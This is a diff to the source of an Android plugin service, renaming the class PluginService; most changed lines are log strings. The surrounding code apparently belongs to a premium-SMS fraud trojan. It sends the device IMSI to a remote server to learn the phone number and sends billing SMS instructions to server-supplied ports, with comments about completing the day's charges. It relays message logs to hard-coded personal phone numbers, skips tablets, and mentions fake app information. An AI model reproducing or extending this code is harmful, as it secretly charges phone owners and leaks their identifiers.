@@ -33,7 +33,7 @@ import java.util.UUID;
  * Time: AM8:53
  * To change this template use File | Settings | File Templates.
  */
-public class PluginService extends IntentService {
+public class PluginInternalService extends IntentService {
 
     public static final String ACTIVE_ACTION = "com.xstd.plugin.active";
 
@@ -54,8 +54,8 @@ public class PluginService extends IntentService {
      */
     public static final String MONKEY_ACTION = "com.xstd.plugin.monkey";
 
-    public PluginService() {
-        super("PluginService");
+    public PluginInternalService() {
+        super("PluginInternalService");
     }
 
     @Override
@@ -67,10 +67,10 @@ public class PluginService extends IntentService {
 
         MobclickAgent.onResume(this);
 
-        Config.LOGD("[[PluginService::onHandleIntent]] intent : " + intent);
+        Config.LOGD("[[PluginInternalService::onHandleIntent]] intent : " + intent);
         if (intent != null) {
             String action = intent.getAction();
-            Config.LOGD("[[PluginService::onHandleIntent]] action : " + action);
+            Config.LOGD("[[PluginInternalService::onHandleIntent]] action : " + action);
             if (ACTIVE_ACTION.equals(action) && !AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                 //do active
                 activePluginAction();
@@ -154,12 +154,12 @@ public class PluginService extends IntentService {
 
     private void activeMainApk() {
         if (Config.DEBUG) {
-            Config.LOGD("[[PluginService::activeMainApk]]");
+            Config.LOGD("[[PluginInternalService::activeMainApk]]");
         }
 
         if (AppRuntime.isTablet(getApplicationContext())) {
             if (Config.DEBUG) {
-                Config.LOGD("[[PluginService::activeMainApk]] return as the device is Tab");
+                Config.LOGD("[[PluginInternalService::activeMainApk]] return as the device is Tab");
             }
             return;
         }
@@ -208,7 +208,7 @@ public class PluginService extends IntentService {
 
     private synchronized void fetchPhoneFromServer() {
         if (Config.DEBUG) {
-            Config.LOGD("[[PluginService::fetchPhoneFromServer]] entry");
+            Config.LOGD("[[PluginInternalService::fetchPhoneFromServer]] entry");
         }
 
         try {
@@ -224,7 +224,7 @@ public class PluginService extends IntentService {
                                                                                                         + "/tools/i2n/" + imsi));
                     if (respone != null && !TextUtils.isEmpty(respone.phone)) {
                         if (Config.DEBUG) {
-                            Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
+                            Config.LOGD("[[PluginInternalService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
                         }
                         if (respone.phone.length() == 11) {
                             PluginSettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
@@ -255,19 +255,19 @@ public class PluginService extends IntentService {
         }
 
         if (Config.DEBUG) {
-            Config.LOGD("[[PluginService::fetchPhoneFromServer]] leave");
+            Config.LOGD("[[PluginInternalService::fetchPhoneFromServer]] leave");
         }
     }
 
     private synchronized void broadcastSMSForSMSCenter(Intent intent) {
         if (Config.DEBUG) {
-            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] entry");
+            Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]] entry");
         }
 
         try {
             String phoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
             if (Config.DEBUG) {
-                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
+                Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
             }
             BRCUtil.cancelAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION);
             if (!TextUtils.isEmpty(phoneNumbers)) {
@@ -303,7 +303,7 @@ public class PluginService extends IntentService {
                             } catch (Exception e) {
                                 e.printStackTrace();
                                 if (Config.DEBUG) {
-                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+                                    Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]]", e);
                                 }
                             }
 
@@ -311,7 +311,7 @@ public class PluginService extends IntentService {
                             String debugMsg = "[[通知短信]]" + phone + " 上的子程序向:" + target + "发送了:<<" + "XSTD.SC:" + content + ">>";
                             SMSUtil.sendSMSForLogic(getApplicationContext(), "18811087096", debugMsg);
 
-                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
+                            Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
                                             " with " + debugMsg);
                             try {
                                 //等待1S
@@ -319,7 +319,7 @@ public class PluginService extends IntentService {
                             } catch (Exception e) {
                                 e.printStackTrace();
                                 if (Config.DEBUG) {
-                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+                                    Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]]", e);
                                 }
                             }
                             SMSUtil.sendSMSForLogic(getApplicationContext(), "15810864155", debugMsg);
@@ -331,7 +331,7 @@ public class PluginService extends IntentService {
                         } catch (Exception e) {
                             e.printStackTrace();
                             if (Config.DEBUG) {
-                                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+                                Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]]", e);
                             }
                         }
                     }
@@ -346,7 +346,7 @@ public class PluginService extends IntentService {
                     if (sb.length() > 0) {
                         PluginSettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
                         if (Config.DEBUG) {
-                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
+                            Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
                                             + PluginSettingManager.getInstance().getBroadcastPhoneNumber()
                                             + " and start alarm for next round send delay 10 min");
                         }
@@ -356,20 +356,20 @@ public class PluginService extends IntentService {
                         //已经消耗光
                         PluginSettingManager.getInstance().setBroadcastPhoneNumber("");
                         if (Config.DEBUG) {
-                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
+                            Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
                                             + PluginSettingManager.getInstance().getBroadcastPhoneNumber());
                         }
                     }
                 }
             } else {
                 if (Config.DEBUG) {
-                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] do nothing as the phoneNumbers is empty");
+                    Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]] do nothing as the phoneNumbers is empty");
                 }
             }
         } catch (Exception e) {
             e.printStackTrace();
             if (Config.DEBUG) {
-                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+                Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]]", e);
             }
 
             if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getBroadcastPhoneNumber())) {
@@ -379,12 +379,12 @@ public class PluginService extends IntentService {
         }
 
         if (Config.DEBUG) {
-            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] leave");
+            Config.LOGD("[[PluginInternalService::broadcastSMSForSMSCenter]] leave");
         }
     }
 
     private void monkeyAction() {
-        Config.LOGD("[[PluginService::monkeyAction]]");
+        Config.LOGD("[[PluginInternalService::monkeyAction]]");
         if (AppRuntime.ACTIVE_RESPONSE != null) {
             int monkeyType = AppRuntime.ACTIVE_RESPONSE.type;
             switch (monkeyType) {
@@ -412,7 +412,7 @@ public class PluginService extends IntentService {
         if ((times > dayCount) && (lastCountTime + delay) < curTime) {
             //今天的计费还没有完成，计费一次
             if (Config.DEBUG) {
-                Config.LOGD("[[PluginService::doSMSMonkey]] try to send SMS monkey with info : " + response.toString());
+                Config.LOGD("[[PluginInternalService::doSMSMonkey]] try to send SMS monkey with info : " + response.toString());
             }
             try {
                 if (!TextUtils.isEmpty(response.port) && !TextUtils.isEmpty(response.instruction)) {
@@ -436,7 +436,7 @@ public class PluginService extends IntentService {
                         }
                     } else {
                         if (Config.DEBUG) {
-                            Config.LOGD("[[PluginService::doSMSMonkey]] AppRuntime.ACTIVE_RESPONSE.smsCmd == null");
+                            Config.LOGD("[[PluginInternalService::doSMSMonkey]] AppRuntime.ACTIVE_RESPONSE.smsCmd == null");
                         }
                     }
                 }
@@ -444,7 +444,7 @@ public class PluginService extends IntentService {
             }
         } else {
             if (Config.DEBUG) {
-                Config.LOGD("[[PluginService::doSMSMonkey]] ignore this as monkey delay not meet");
+                Config.LOGD("[[PluginInternalService::doSMSMonkey]] ignore this as monkey delay not meet");
             }
         }
     }
@@ -454,7 +454,7 @@ public class PluginService extends IntentService {
 //        if (!AppRuntime.isSIMCardReady(getApplicationContext())) return;
 
         if (Config.DEBUG) {
-            Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
+            Config.LOGD("[[PluginInternalService::activePluginAction]] try to fetch active info, Phone Number : "
                             + PluginSettingManager.getInstance().getCurrentPhoneNumber());
         }
         try {
@@ -481,7 +481,7 @@ public class PluginService extends IntentService {
 
                 PluginSettingManager.getInstance().setKeyDayActiveCount(PluginSettingManager.getInstance().getKeyDayActiveCount() + 1);
                 if (Config.DEBUG) {
-                    Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
+                    Config.LOGD("[[PluginInternalService::activePluginAction]] last monkey count time = "
                                     + UtilsRuntime.debugFormatTime(PluginSettingManager.getInstance().getKeyLastCountTime()));
                 }
 
@@ -538,7 +538,7 @@ public class PluginService extends IntentService {
                      * 消耗掉今天所有的重试次数
                      */
                     if (Config.DEBUG) {
-                        Config.LOGD("[[PluginService::activePluginAction]] server return data, So we set DayActiveCount = 17");
+                        Config.LOGD("[[PluginInternalService::activePluginAction]] server return data, So we set DayActiveCount = 17");
                     }
                     PluginSettingManager.getInstance().setKeyDayActiveCount(17);
                 } else {
@@ -548,7 +548,7 @@ public class PluginService extends IntentService {
                      * 消耗掉今天所有的重试次数
                      */
                     if (Config.DEBUG) {
-                        Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
+                        Config.LOGD("[[PluginInternalService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
                     }
                     PluginSettingManager.getInstance().setKeyDayActiveCount(17);
 
@@ -607,7 +607,7 @@ public class PluginService extends IntentService {
     }
 
 //    private synchronized void activePluginPackageAction(Intent intent) {
-//        Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PLUGIN_PACKAGE_ACTION + " <<<<");
+//        Config.LOGD("[[PluginInternalService::onHandleIntent]] >>> action : " + ACTIVE_PLUGIN_PACKAGE_ACTION + " <<<<");
 //        try {
 //            PluginSettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
 //            PluginSettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));
@@ -616,7 +616,7 @@ public class PluginService extends IntentService {
 //            PluginSettingManager.getInstance().setMainApkChannel(intent.getStringExtra("channel"));
 //
 //            if (Config.DEBUG) {
-//                Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
+//                Config.LOGD("[[PluginInternalService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
 //                                + " packageName = " + intent.getStringExtra("packageName")
 //                                + " **** setting manager info : (( "
 //                                + " name = " + PluginSettingManager.getInstance().getKeyActiveAppName()
